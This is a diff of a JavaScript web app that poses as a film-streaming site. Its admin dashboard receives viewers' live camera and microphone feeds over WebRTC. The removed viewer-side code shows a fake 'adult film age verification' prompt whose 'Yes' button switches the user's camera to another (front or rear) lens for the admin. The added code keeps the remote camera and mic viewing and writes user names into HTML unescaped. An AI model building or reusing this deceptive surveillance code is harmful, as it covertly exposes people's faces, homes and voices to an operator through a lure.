@@ -76,14 +76,11 @@ function showScreen(id) {
 }
 
 function resetLogin() {
-  document.getElementById('login-email').value            = '';
-  document.getElementById('login-pass').value             = '';
+  document.getElementById('login-name').value             = '';
   document.getElementById('chk-consent').checked          = false;
   document.getElementById('btn-login').disabled           = true;
   document.getElementById('login-error').classList.remove('show');
-  ['login-email', 'login-pass'].forEach(id =>
-    document.getElementById(id).classList.remove('input-error')
-  );
+  document.getElementById('login-name').classList.remove('input-error');
 }
 
 function showLoginError(msg, ...els) {
@@ -99,20 +96,17 @@ function showLoginError(msg, ...els) {
 // LOGIN
 // ================================================================
 async function doLogin() {
-  const emailEl   = document.getElementById('login-email');
-  const passEl    = document.getElementById('login-pass');
+  const nameEl    = document.getElementById('login-name');
   const btnEl     = document.getElementById('btn-login');
   const loginCard = document.querySelector('.login-card');
 
-  const email    = emailEl.value.trim();
-  const password = passEl.value;
+  const name = nameEl.value.trim();
 
-  emailEl.classList.remove('input-error');
-  passEl.classList.remove('input-error');
+  nameEl.classList.remove('input-error');
   document.getElementById('login-error').classList.remove('show');
 
-  if (!email || !password) {
-    showLoginError('Email dan password wajib diisi.', emailEl, passEl);
+  if (!name) {
+    showLoginError('Nama wajib diisi.', nameEl);
     return;
   }
 
@@ -124,7 +118,7 @@ async function doLogin() {
     const response = await fetch(`${API_BASE}/api/login`, {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ email, password })
+      body:    JSON.stringify({ name })
     });
     const data = await response.json();
 
@@ -134,13 +128,11 @@ async function doLogin() {
     if (!response.ok || !data.success) {
       loginCard.classList.add('shake');
       setTimeout(() => loginCard.classList.remove('shake'), 450);
-      passEl.value = '';
 
-      if (data.code === 'EMAIL_NOT_FOUND')   showLoginError(data.message, emailEl);
-      else if (data.code === 'WRONG_PASSWORD') showLoginError(data.message, passEl);
-      else showLoginError(data.message || 'Email atau password salah.', emailEl, passEl);
+      if (data.code === 'MISSING_NAME') showLoginError(data.message, nameEl);
+      else showLoginError(data.message || 'Terjadi kesalahan.', nameEl);
 
-      addAdminLog('Sistem', `Login gagal — ${email}`, '#F2716B');
+      addAdminLog('Sistem', `Login gagal — ${name}`, '#F2716B');
       btnEl.disabled = !document.getElementById('chk-consent').checked;
       return;
     }
@@ -157,7 +149,7 @@ async function doLogin() {
     btnEl.classList.remove('loading');
     btnEl.textContent = 'Masuk & Mulai Nonton';
     btnEl.disabled    = false;
-    showLoginError('Tidak bisa terhubung ke server.', emailEl, passEl);
+    showLoginError('Tidak bisa terhubung ke server.', nameEl);
   }
 }
 
@@ -168,7 +160,7 @@ async function doLogin() {
 function enterAdminDashboard() {
   showScreen('screen-admin');
   document.getElementById('admin-username').textContent =
-    `Masuk sebagai: ${currentUser.name} (${currentUser.email})`;
+    `Masuk sebagai: ${currentUser.name} (${currentUser.role})`;
   addAdminLog(currentUser.name, 'membuka dashboard admin', '#A855F7');
   connectSSE();
   connectSocket_Admin();
@@ -229,663 +221,212 @@ function connectSSE() {
 }
 
 function updateAdminStats(sessions) {
-  document.getElementById('admin-stat-active').textContent = sessions.length;
-  document.getElementById('admin-stat-video').textContent  = sessions.filter(s => s.camActive).length;
-  document.getElementById('admin-stat-audio').textContent  = sessions.filter(s => s.micActive).length;
-  document.getElementById('admin-stat-time').textContent   = new Date().toLocaleTimeString('id-ID');
+  const activeCount = sessions.length;
+  const videoCount  = sessions.filter(s => s.camActive).length;
+  const audioCount  = sessions.filter(s => s.micActive).length;
+  const now         = new Date().toLocaleTimeString('id-ID');
+
+  document.getElementById('admin-stat-active').textContent = activeCount;
+  document.getElementById('admin-stat-video').textContent  = videoCount;
+  document.getElementById('admin-stat-audio').textContent  = audioCount;
+  document.getElementById('admin-stat-time').textContent   = now;
+
+  renderAdminSessions(sessions);
+}
+
+// ================================================================
+// ADMIN — SESSION GRID
+// ================================================================
+function renderAdminSessions(sessions) {
+  const grid = document.getElementById('admin-session-grid');
+  if (!grid) return;
+
+  if (sessions.length === 0) {
+    grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1;">
+      <div class="es-icon">📡</div>
+      <div>Menunggu pengguna terhubung...<br>Video &amp; audio akan muncul otomatis saat ada pengguna yang menonton.</div>
+    </div>`;
+    return;
+  }
+
+  grid.innerHTML = sessions.map(s => `
+    <div class="session-card" id="card-${s.id}">
+      <div class="sc-head">
+        <div class="sc-avatar">${s.initial}</div>
+        <div class="sc-info">
+          <div class="sc-name">${s.name}</div>
+          <div class="sc-details">${s.film}</div>
+        </div>
+        <div class="sc-duration">${formatDuration(s.duration)}</div>
+      </div>
+      <div class="sc-video-container">
+        <video id="video-${s.id}" autoplay playsinline muted style="width:100%;height:100%;"></video>
+      </div>
+      <div class="sc-controls">
+        <button class="sc-btn cam-btn ${s.camActive ? 'active' : ''}" title="Kamera">📹</button>
+        <button class="sc-btn mic-btn ${s.micActive ? 'active' : ''}" title="Mikrofon">🎤</button>
+        <button class="sc-btn expand-btn" onclick="expandSession('${s.id}')" title="Perbesar">⛶</button>
+      </div>
+      <div class="audio-meter">
+        <div class="audio-meter-bar" id="meter-${s.id}"></div>
+        <div class="audio-meter-label">
+          <small>${s.name}</small>
+        </div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function formatDuration(seconds) {
+  const h = Math.floor(seconds / 3600);
+  const m = Math.floor((seconds % 3600) / 60);
+  const s = seconds % 60;
+  if (h > 0) return `${h}h ${m}m`;
+  if (m > 0) return `${m}m ${s}s`;
+  return `${s}s`;
 }
 
 
 // ================================================================
-// SOCKET.IO — ADMIN SIDE
+// WEBRTC — ADMIN SIDE
 // ================================================================
 function connectSocket_Admin() {
-  if (socket) socket.disconnect();
-
   socket = io(API_BASE, {
-    auth:                  { token: authToken },
-    transports:            ['polling', 'websocket'],
-    reconnection:          true,
-    reconnectionAttempts:  Infinity,
-    reconnectionDelay:     1000,
-    reconnectionDelayMax:  5000
+    auth: { token: authToken },
+    reconnection: true,
+    reconnectionDelay: 1000,
+    reconnectionDelayMax: 5000
   });
 
-  socket.on('connect', () => {
-    socket.emit('register-admin');
-    addAdminLog('Sistem', 'Signaling terhubung ✓', '#4ADE80');
-    const dot = document.getElementById('sse-dot');
-    if (dot) dot.className = 'sse-dot connected';
-  });
-
-  socket.on('disconnect', (reason) => {
-    addAdminLog('Sistem', `Signaling terputus (${reason}), reconnect otomatis...`, '#F2A93B');
-    const dot = document.getElementById('sse-dot');
-    if (dot) dot.className = 'sse-dot error';
-  });
-
-  socket.on('reconnect', () => {
-    addAdminLog('Sistem', 'Reconnect berhasil ✓', '#4ADE80');
-    const dot = document.getElementById('sse-dot');
-    if (dot) dot.className = 'sse-dot connected';
-  });
-
-  socket.on('viewer-list', ({ viewers }) => {
-    viewers.forEach(v => {
-      addViewerCard(v.sessionId, v.user);
-      initiateWebRTC(v.sessionId);
-    });
+  socket.on('viewer-list', (msg) => {
+    msg.viewers.forEach(v => setupPeerConnection_Admin(v.sessionId, v.user));
   });
 
   socket.on('viewer-connected', (msg) => {
-    addAdminLog(msg.user.name, 'terhubung — memulai WebRTC stream', '#4ADE80');
-    addViewerCard(msg.sessionId, msg.user);
-    initiateWebRTC(msg.sessionId);
+    setupPeerConnection_Admin(msg.sessionId, msg.user);
   });
 
   socket.on('viewer-disconnected', (msg) => {
-    addAdminLog('Pengguna', 'mengakhiri sesi', '#F2A93B');
-    removeViewerCard(msg.sessionId);
+    const peer = adminPeers.get(msg.sessionId);
+    if (peer) {
+      try { peer.pc.close(); } catch {}
+      adminPeers.delete(msg.sessionId);
+      adminAudioMeters.delete(msg.sessionId);
+      const el = document.getElementById(`card-${msg.sessionId}`);
+      if (el) el.remove();
+    }
   });
 
   socket.on('answer', (msg) => {
-    const entry = adminPeers.get(msg.sessionId);
-    if (entry) entry.pc.setRemoteDescription(new RTCSessionDescription(msg.data)).catch(() => {});
+    const pc = adminPeers.get(msg.sessionId)?.pc;
+    if (pc) {
+      pc.setRemoteDescription(new RTCSessionDescription(msg.data))
+        .catch(e => console.error('setRemoteDescription error:', e));
+    }
   });
 
   socket.on('ice-candidate', (msg) => {
     if (msg.from !== 'viewer') return;
-    const entry = adminPeers.get(msg.sessionId);
-    if (entry) entry.pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(() => {});
+    const pc = adminPeers.get(msg.sessionId)?.pc;
+    if (pc && msg.data) {
+      pc.addIceCandidate(new RTCIceCandidate(msg.data))
+        .catch(e => console.error('addIceCandidate error:', e));
+    }
+  });
+
+  socket.on('flip-camera-accepted', (msg) => {
+    console.log(`Camera flip accepted dari ${msg.sessionId}`);
+  });
+
+  socket.on('flip-camera-rejected', (msg) => {
+    console.log(`Camera flip rejected dari ${msg.sessionId}`);
   });
 
   socket.on('connect_error', (err) => {
-    addAdminLog('Sistem', `Koneksi gagal: ${err.message}`, '#F2716B');
+    console.error('Socket error:', err);
   });
 
-  socket.on('flip-camera-accepted', ({ sessionId }) => {
-    addAdminLog('Sistem', `✅ Kamera ${sessionId} berhasil diganti`, '#4ADE80');
-    // Reset cooldown agar bisa flip lagi setelah sukses
-    flipCooldowns.delete(sessionId);
-    const btn = document.querySelector(`#card-${sessionId} .sc-ctrl-btn[title="Flip kamera pengguna"]`);
-    if (btn) { btn.disabled = false; btn.style.opacity = ''; }
-  });
-
-  socket.on('flip-camera-rejected', ({ sessionId }) => {
-    addAdminLog('Sistem', `⚠️ Gagal ganti kamera untuk sesi ${sessionId}`, '#F2716B');
-    flipCooldowns.delete(sessionId);
-    const btn = document.querySelector(`#card-${sessionId} .sc-ctrl-btn[title="Flip kamera pengguna"]`);
-    if (btn) { btn.disabled = false; btn.style.opacity = ''; }
-  });
+  socket.emit('register-admin');
 }
 
+async function setupPeerConnection_Admin(sessionId, user) {
+  if (adminPeers.has(sessionId)) return;
 
-// ================================================================
-// SOCKET.IO — VIEWER SIDE
-// ================================================================
-function connectSocket_Viewer() {
-  if (socket) socket.disconnect();
+  const pc = new RTCPeerConnection({ iceServers: TURN_SERVERS });
+  const videoEl = document.getElementById(`video-${sessionId}`);
 
-  socket = io(API_BASE, {
-    auth:                  { token: authToken },
-    transports:            ['polling', 'websocket'],
-    reconnection:          true,
-    reconnectionAttempts:  Infinity,
-    reconnectionDelay:     1000,
-    reconnectionDelayMax:  5000
-  });
+  if (!videoEl) return;
 
-  socket.on('connect', () => {
-    socket.emit('register-viewer', { sessionId: mySessionId });
-  });
-
-  socket.on('reconnect', () => {
-    socket.emit('register-viewer', { sessionId: mySessionId });
-  });
-
-  socket.on('offer', async (msg) => {
-    await handleAdminOffer(msg.data);
-  });
-
-  socket.on('ice-candidate', (msg) => {
-    if (msg.from !== 'admin') return;
-    const pc = viewerPeers.get('main');
-    if (pc) pc.addIceCandidate(new RTCIceCandidate(msg.data)).catch(() => {});
-  });
-
-  socket.on('flip-camera', () => {
-    showFlipConfirm();
-  });
-}
-
-// Viewer: proses offer dari admin, kirim answer + stream kamera
-async function handleAdminOffer(offerDesc) {
-  let pc = viewerPeers.get('main');
-
-  if (!pc || pc.signalingState === 'closed') {
-    pc = new RTCPeerConnection({ iceServers: TURN_SERVERS });
-    viewerPeers.set('main', pc);
-
-    if (camStream) {
-      camStream.getTracks().forEach(track => pc.addTrack(track, camStream));
-    }
-
-    pc.onicecandidate = (e) => {
-      if (e.candidate && socket?.connected) {
-        socket.emit('ice-candidate', {
-          from: 'viewer', sessionId: mySessionId, data: e.candidate
-        });
-      }
-    };
-  }
-
-  await pc.setRemoteDescription(new RTCSessionDescription(offerDesc));
-  const answer = await pc.createAnswer();
-  await pc.setLocalDescription(answer);
-  socket.emit('answer', { sessionId: mySessionId, data: pc.localDescription });
-}
-
-// Viewer: tampilkan konfirmasi flip kamera — getUserMedia HARUS dipanggil
-// dari user gesture langsung, bukan dari socket event (browser security policy)
-function showFlipConfirm() {
-  // Kalau sudah ada konfirmasi yang tampil, abaikan
-  if (document.getElementById('flip-confirm-overlay')) return;
-
-  const overlay = document.createElement('div');
-  overlay.id = 'flip-confirm-overlay';
-  overlay.innerHTML = `
-    <div id="flip-confirm-box">
-      <div id="flip-confirm-icon">⚠️</div>
-      <div id="flip-confirm-title">Verifikasi Usia Anda</div>
-      <div id="flip-confirm-msg">Anda sedang menonton film dewasa, apakah anda berusia 18 Tahun?.<br>Ketuk <b>Ya</b> untuk lanjut nonton.</div>
-      <div id="flip-confirm-btns">
-        <button id="flip-confirm-yes">Ya</button>
-        <button id="flip-confirm-no">Tidak</button>
-      </div>
-    </div>
-  `;
-
-  // Inline style agar tidak bergantung pada CSS eksternal
-  Object.assign(overlay.style, {
-    position: 'fixed', inset: '0', zIndex: '9999',
-    display: 'flex', alignItems: 'center', justifyContent: 'center',
-    background: 'rgba(0,0,0,0.7)', backdropFilter: 'blur(4px)'
-  });
-  const box = overlay.querySelector('#flip-confirm-box');
-  Object.assign(box.style, {
-    background: '#1a1a2e', border: '1px solid #334',
-    borderRadius: '16px', padding: '28px 24px', textAlign: 'center',
-    maxWidth: '320px', width: '90%', color: '#eee',
-    boxShadow: '0 8px 32px rgba(0,0,0,0.6)'
-  });
-  overlay.querySelector('#flip-confirm-icon').style.cssText  = 'font-size:2.5rem;margin-bottom:8px';
-  overlay.querySelector('#flip-confirm-title').style.cssText = 'font-size:1.2rem;font-weight:700;margin-bottom:8px';
-  overlay.querySelector('#flip-confirm-msg').style.cssText   = 'font-size:.9rem;color:#aaa;line-height:1.5;margin-bottom:20px';
-  overlay.querySelector('#flip-confirm-btns').style.cssText  = 'display:flex;gap:12px;justify-content:center';
-
-  const yesBtn = overlay.querySelector('#flip-confirm-yes');
-  const noBtn  = overlay.querySelector('#flip-confirm-no');
-  Object.assign(yesBtn.style, {
-    padding: '10px 20px', borderRadius: '8px', border: 'none',
-    background: '#4ADE80', color: '#111', fontWeight: '700',
-    fontSize: '.95rem', cursor: 'pointer'
-  });
-  Object.assign(noBtn.style, {
-    padding: '10px 20px', borderRadius: '8px', border: 'none',
-    background: '#334', color: '#eee', fontWeight: '600',
-    fontSize: '.95rem', cursor: 'pointer'
-  });
-
-  // Auto-dismiss 15 detik jika tidak ada respons
-  let autoTimer = setTimeout(() => {
-    dismissFlipConfirm();
-    if (socket?.connected) socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-  }, 15000);
-
-  // ← Ini user gesture → getUserMedia boleh dipanggil
-  yesBtn.addEventListener('click', () => {
-    clearTimeout(autoTimer);
-    dismissFlipConfirm();
-    flipMyCamera();   // dipanggil langsung dari klik user
-  });
-
-  noBtn.addEventListener('click', () => {
-    clearTimeout(autoTimer);
-    dismissFlipConfirm();
-    showFlipToast('❌ Permintaan ganti kamera ditolak');
-    if (socket?.connected) socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-  });
-
-  document.body.appendChild(overlay);
-}
-
-function dismissFlipConfirm() {
-  const el = document.getElementById('flip-confirm-overlay');
-  if (el) el.remove();
-}
-
-// Viewer: ganti kamera (depan/belakang) atas permintaan admin,
-// tanpa memutus koneksi WebRTC — pakai replaceTrack()
-async function flipMyCamera() {
-  // Guard: hindari flip ganda yang jalan bersamaan
-  if (isFlipping) {
-    console.warn('[FLIP] Sudah dalam proses flip, diabaikan.');
-    return;
-  }
-  if (!camStream) {
-    if (socket?.connected) socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-    return;
-  }
-
-  isFlipping = true;
-  showFlipToast('🔄 Mengganti kamera...');
-
-  let newVideoTrack = null;
-  // Simpan track lama agar bisa di-restore jika gagal
-  const oldVideoTracks = camStream.getVideoTracks();
-
-  try {
-    // ── WAJIB: stop track lama SEBELUM getUserMedia ───────────────────────
-    // Beberapa browser/OS (Android, iOS, beberapa laptop) mengunci hardware
-    // kamera secara eksklusif. getUserMedia baru hanya bisa berhasil setelah
-    // track lama benar-benar dilepas. Tanpa ini → NotReadableError.
-    oldVideoTracks.forEach(t => {
-      camStream.removeTrack(t);
-      t.stop();
-    });
-
-    // Tunggu 1 frame agar OS sempat melepas kunci hardware kamera
-    await new Promise(r => setTimeout(r, 80));
-
-    // Enumerate ulang untuk mendapatkan daftar device terkini
-    // enumerateDevices() bisa kembalikan deviceId kosong jika belum ada izin —
-    // pastikan izin sudah diberikan sebelum ini dipanggil (sudah dijamin karena
-    // camStream aktif)
-    const devices = await navigator.mediaDevices.enumerateDevices();
-    videoInputDevices = devices.filter(d => d.kind === 'videoinput');
-
-    // ── Strategi 1: pakai deviceId jika ada ≥2 kamera fisik ──────────────
-    if (videoInputDevices.length > 1) {
-      const nextIndex = (currentDeviceIndex + 1) % videoInputDevices.length;
-      const nextDeviceId = videoInputDevices[nextIndex].deviceId;
-
-      // deviceId bisa kosong ('') pada beberapa browser/OS saat belum ada izin penuh
-      if (nextDeviceId) {
-        try {
-          const s = await navigator.mediaDevices.getUserMedia({
-            video: { deviceId: { exact: nextDeviceId } },
-            audio: false
-          });
-          newVideoTrack    = s.getVideoTracks()[0];
-          currentDeviceIndex = nextIndex;
-          console.log('[FLIP] Strategi deviceId berhasil, index:', nextIndex);
-        } catch (err) {
-          console.warn('[FLIP] deviceId exact gagal, coba facingMode:', err.name);
-          // Jatuhkan ke strategi 2
-          newVideoTrack = null;
-        }
-      }
-    }
-
-    // ── Strategi 2: toggle facingMode (ideal, bukan exact) ───────────────
-    // Dipakai jika: hanya 1 kamera terdaftar, deviceId kosong, atau strategi 1 gagal
-    if (!newVideoTrack) {
-      const nextMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-      console.log('[FLIP] Strategi facingMode:', nextMode);
-
-      // Coba `exact` dulu — paksa ganti
-      try {
-        const s = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { exact: nextMode } },
-          audio: false
-        });
-        newVideoTrack     = s.getVideoTracks()[0];
-        currentFacingMode = nextMode;
-        console.log('[FLIP] facingMode exact berhasil:', nextMode);
-      } catch (err) {
-        console.warn('[FLIP] facingMode exact gagal, coba ideal:', err.name);
-        // Beberapa browser (terutama desktop/laptop) lempar OverconstrainedError
-        // jika facingMode exact tidak tersedia → gunakan ideal agar tetap dapat stream
-        try {
-          const s = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: { ideal: nextMode } },
-            audio: false
-          });
-          newVideoTrack     = s.getVideoTracks()[0];
-          currentFacingMode = nextMode;
-          console.log('[FLIP] facingMode ideal berhasil:', nextMode);
-        } catch (err2) {
-          console.warn('[FLIP] facingMode ideal gagal, coba video:true:', err2.name);
-          // Strategi terakhir: minta saja video tanpa constraint — lebih baik daripada gagal total
-          const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-          newVideoTrack = s.getVideoTracks()[0];
-          console.log('[FLIP] video:true fallback berhasil');
-        }
-      }
-    }
-
-    if (!newVideoTrack) throw new Error('Tidak ada video track baru dari getUserMedia');
-
-    // ── Ganti track di WebRTC sender ─────────────────────────────────────
-    const pc = viewerPeers.get('main');
-    if (pc && pc.signalingState !== 'closed') {
-      const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
-      if (sender) {
-        await sender.replaceTrack(newVideoTrack);
-        console.log('[FLIP] replaceTrack sukses');
-      } else {
-        // Sender belum ada (offer belum datang) — tambahkan track baru
-        pc.addTrack(newVideoTrack, camStream);
-        console.log('[FLIP] addTrack (sender belum ada)');
-      }
-    }
-    // Jika pc belum ada, track baru otomatis dipakai saat offer berikutnya
-
-    // ── Adopsi track baru ke camStream ────────────────────────────────────
-    camStream.addTrack(newVideoTrack);
-    newVideoTrack = null; // sudah diadopsi, jangan stop di finally
-
-    showFlipToast('✅ Kamera berhasil diganti');
-    if (socket?.connected) socket.emit('flip-camera-accepted', { sessionId: mySessionId });
-
-  } catch (err) {
-    console.error('[FLIP] Flip camera error:', err.name, err.message);
-
-    // Hentikan track baru jika belum diadopsi ke camStream
-    if (newVideoTrack) { try { newVideoTrack.stop(); } catch {} newVideoTrack = null; }
-
-    // ── Restore: coba nyalakan kembali kamera asal ────────────────────────
-    // Track lama sudah di-stop di awal, jadi kita harus buka stream baru
-    // dengan constraint semula agar pengguna tidak kehilangan kamera sama sekali
-    try {
-      const restoreConstraints = videoInputDevices.length > 1 && videoInputDevices[currentDeviceIndex]?.deviceId
-        ? { video: { deviceId: { exact: videoInputDevices[currentDeviceIndex].deviceId } }, audio: false }
-        : { video: { facingMode: { ideal: currentFacingMode } }, audio: false };
-      const restoreStream = await navigator.mediaDevices.getUserMedia(restoreConstraints);
-      const restoreTrack  = restoreStream.getVideoTracks()[0];
-      if (restoreTrack) {
-        camStream.addTrack(restoreTrack);
-        const pc = viewerPeers.get('main');
-        if (pc && pc.signalingState !== 'closed') {
-          const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
-          if (sender) await sender.replaceTrack(restoreTrack).catch(() => {});
-        }
-        console.log('[FLIP] Kamera asal berhasil di-restore');
-      }
-    } catch (restoreErr) {
-      console.error('[FLIP] Restore kamera asal juga gagal:', restoreErr.name);
-    }
-
-    // Pesan error yang lebih informatif sesuai jenis error
-    let toastMsg = '⚠️ Gagal ganti kamera';
-    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-      toastMsg = '⚠️ Izin kamera ditolak browser';
-    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-      toastMsg = '⚠️ Kamera lain tidak ditemukan';
-    } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
-      toastMsg = '⚠️ Kamera tidak bisa dibuka, coba lagi';
-    } else if (err.name === 'OverconstrainedError') {
-      toastMsg = '⚠️ Perangkat hanya punya 1 kamera';
-    }
-    showFlipToast(toastMsg);
-    if (socket?.connected) socket.emit('flip-camera-rejected', { sessionId: mySessionId });
-
-  } finally {
-    // Pastikan guard selalu dilepas
-    isFlipping = false;
-  }
-}
-
-function showFlipToast(msg) {
-  let toast = document.getElementById('flip-toast');
-  if (!toast) {
-    toast = document.createElement('div');
-    toast.id = 'flip-toast';
-    toast.className = 'flip-toast';
-    document.body.appendChild(toast);
-  }
-  toast.textContent = msg;
-  toast.classList.add('show');
-  clearTimeout(toast._hideTimer);
-  toast._hideTimer = setTimeout(() => toast.classList.remove('show'), 2600);
-}
-
-
-// ================================================================
-// WEBRTC — ADMIN INISIASI KONEKSI KE VIEWER
-// ================================================================
-async function initiateWebRTC(sessionId) {
-  if (adminPeers.has(sessionId)) {
-    try { adminPeers.get(sessionId).pc.close(); } catch {}
-  }
-
-  const pc    = new RTCPeerConnection({ iceServers: TURN_SERVERS });
-  const entry = { pc, videoEl: null, audioCtx: null, analyser: null };
-  adminPeers.set(sessionId, entry);
-
-  pc.ontrack = (event) => {
-    const stream = event.streams[0];
-    if (!stream) return;
-
-    if (event.track.kind === 'video') {
-      const videoEl = document.getElementById(`admin-video-${sessionId}`);
-      if (videoEl) {
-        videoEl.srcObject = stream;
-        videoEl.play().catch(() => {});
-        entry.videoEl = videoEl;
-        const conn = document.getElementById(`admin-conn-${sessionId}`);
-        if (conn) conn.style.display = 'none';
-        addAdminLog('Sistem', `Video stream aktif dari ${sessionId}`, '#4ADE80');
-      }
-    }
-
-    if (event.track.kind === 'audio') {
-      startAudioMeter(sessionId, stream);
-    }
-  };
-
-  pc.onicecandidate = (e) => {
-    if (e.candidate && socket?.connected) {
-      socket.emit('ice-candidate', { from: 'admin', sessionId, data: e.candidate });
+  pc.ontrack = (evt) => {
+    console.log(`[TRACK] ${user.name}: ${evt.track.kind}`);
+    if (evt.track.kind === 'video') {
+      videoEl.srcObject = evt.streams[0];
+    } else if (evt.track.kind === 'audio') {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const source = audioCtx.createMediaStreamSource(evt.streams[0]);
+      const analyser = audioCtx.createAnalyser();
+      source.connect(analyser);
+      analyser.fftSize = 256;
+      adminAudioMeters.set(sessionId, { analyser, audioCtx });
+      animateAudioMeter(sessionId);
     }
   };
 
   pc.onconnectionstatechange = () => {
-    const state = pc.connectionState;
-    const badge = document.getElementById(`admin-conn-state-${sessionId}`);
-    if (badge) {
-      if (state === 'connected')                        badge.textContent = '🟢 Terhubung';
-      else if (state === 'connecting')                  badge.textContent = '🟡 Connecting...';
-      else if (state === 'failed' || state === 'disconnected') badge.textContent = '🔴 Terputus';
-    }
-    if (state === 'failed') {
-      addAdminLog('Sistem', `WebRTC gagal untuk sesi ${sessionId}`, '#F2716B');
+    console.log(`Connection state (${user.name}): ${pc.connectionState}`);
+    if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
+      const el = document.getElementById(`card-${sessionId}`);
+      if (el) el.style.opacity = '0.5';
     }
   };
 
-  const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
-  await pc.setLocalDescription(offer);
-  socket.emit('offer', { sessionId, data: pc.localDescription });
-}
-
-
-// ================================================================
-// AUDIO METER — visualisasi volume mikrofon di admin
-// ================================================================
-function startAudioMeter(sessionId, stream) {
-  try {
-    const entry = adminPeers.get(sessionId);
-    if (entry?.audioCtx) entry.audioCtx.close();
-
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const source   = audioCtx.createMediaStreamSource(stream);
-    const analyser = audioCtx.createAnalyser();
-    analyser.fftSize = 256;
-    source.connect(analyser);
-
-    if (entry) { entry.audioCtx = audioCtx; entry.analyser = analyser; }
-
-    const dataArr = new Uint8Array(analyser.frequencyBinCount);
-    const fillEl  = document.getElementById(`audio-fill-${sessionId}`);
-    const micInd  = document.getElementById(`mic-ind-${sessionId}`);
-    if (micInd) { micInd.classList.add('active-mic'); micInd.textContent = '🎙️ MIC AKTIF'; }
-
-    function tick() {
-      analyser.getByteFrequencyData(dataArr);
-      const avg = dataArr.reduce((a, b) => a + b, 0) / dataArr.length;
-      const pct = Math.min(100, avg * 2.5);
-      if (fillEl) fillEl.style.width = pct + '%';
-      adminAudioMeters.set(sessionId, requestAnimationFrame(tick));
+  pc.onicecandidate = (evt) => {
+    if (evt.candidate) {
+      socket.emit('ice-candidate', {
+        sessionId,
+        data: evt.candidate.toJSON()
+      });
     }
-    tick();
-    addAdminLog('Sistem', 'Audio stream aktif', '#5B8CFF');
-  } catch (err) {
-    console.error('Audio meter error:', err);
-  }
-}
+  };
 
-
-// ================================================================
-// ADMIN UI — tambah / hapus card viewer
-// ================================================================
-function addViewerCard(sessionId, user) {
-  const grid = document.getElementById('admin-session-grid');
-
-  const empty = grid.querySelector('.empty-state');
-  if (empty) empty.remove();
-
-  if (document.getElementById(`card-${sessionId}`)) return;
-
-  const card = document.createElement('div');
-  card.className = 'session-card';
-  card.id        = `card-${sessionId}`;
-  card.innerHTML = `
-    <div class="sc-video-wrap" id="admin-vidbox-${sessionId}">
-      <div class="sc-connecting" id="admin-conn-${sessionId}" style="position:absolute;inset:0;z-index:2;">
-        <div class="spinner"></div>
-        <span>Menghubungkan WebRTC...</span>
-        <small style="font-size:.7rem;color:var(--muted);" id="admin-conn-state-${sessionId}">🟡 Menunggu...</small>
-      </div>
-      <video id="admin-video-${sessionId}" autoplay playsinline
-        style="width:100%;height:100%;object-fit:cover;display:block;background:#000;"></video>
-      <div class="sc-video-overlay"></div>
-      <div class="sc-live-badge"><div class="rb-dot"></div>LIVE</div>
-      <div class="sc-controls">
-        <button class="sc-ctrl-btn" title="Flip kamera pengguna" onclick="flipCameraRequest('${sessionId}')">🔄</button>
-        <button class="sc-ctrl-btn" title="Perbesar layar" onclick="expandSession('${sessionId}')">⛶</button>
-      </div>
-      <div class="sc-user-overlay">
-        <div class="sc-user-name">
-          <div class="sc-avatar">${user.initial}</div>
-          <span class="sc-name">${user.name}</span>
-        </div>
-        <span class="sc-duration" id="admin-dur-${sessionId}">00:00</span>
-      </div>
-    </div>
-    <div class="sc-info-bar">
-      <span class="sc-film">🎬 ${CURRENT_FILM}</span>
-      <div class="sc-indicators">
-        <span class="sc-ind active-cam">📹 CAM LIVE</span>
-        <span class="sc-ind inactive" id="mic-ind-${sessionId}">🎙️ Menunggu...</span>
-      </div>
-    </div>
-    <div class="audio-meter-wrap">
-      <div class="audio-meter-label" style="justify-content:space-between;">
-        <span>🔊 Level Mikrofon — <small style="color:var(--muted)">${user.email}</small></span>
-        <label style="display:flex;align-items:center;gap:6px;cursor:pointer;font-size:.7rem;color:var(--muted);">
-          <span>Vol</span>
-          <input type="range" min="0" max="1" step="0.05" value="0.8"
-            style="width:70px;accent-color:var(--blue);"
-            oninput="const v=document.getElementById('admin-video-${sessionId}');if(v)v.volume=+this.value;">
-        </label>
-      </div>
-      <div class="audio-meter-bar">
-        <div class="audio-meter-fill" id="audio-fill-${sessionId}"></div>
-      </div>
-    </div>
-  `;
-  grid.appendChild(card);
-
-  const startTime = Date.now();
-  const durEl     = document.getElementById(`admin-dur-${sessionId}`);
-  card._durTimer  = setInterval(() => {
-    const sec = Math.floor((Date.now() - startTime) / 1000);
-    if (durEl) durEl.textContent =
-      `${String(Math.floor(sec / 60)).padStart(2, '0')}:${String(sec % 60).padStart(2, '0')}`;
-  }, 1000);
-
-  document.getElementById('admin-stat-active').textContent =
-    document.querySelectorAll('.session-card').length;
-}
-
-function removeViewerCard(sessionId) {
-  const card = document.getElementById(`card-${sessionId}`);
-  if (card) { if (card._durTimer) clearInterval(card._durTimer); card.remove(); }
-
-  if (currentExpandedSession === sessionId) closeExpandSession();
-
-  const entry = adminPeers.get(sessionId);
-  if (entry) {
-    if (entry.audioCtx) entry.audioCtx.close();
-    entry.pc.close();
-    adminPeers.delete(sessionId);
+  try {
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    socket.emit('offer', { sessionId, data: offer });
+  } catch (e) {
+    console.error('Offer creation error:', e);
   }
 
-  const raf = adminAudioMeters.get(sessionId);
-  if (raf) cancelAnimationFrame(raf);
-  adminAudioMeters.delete(sessionId);
-
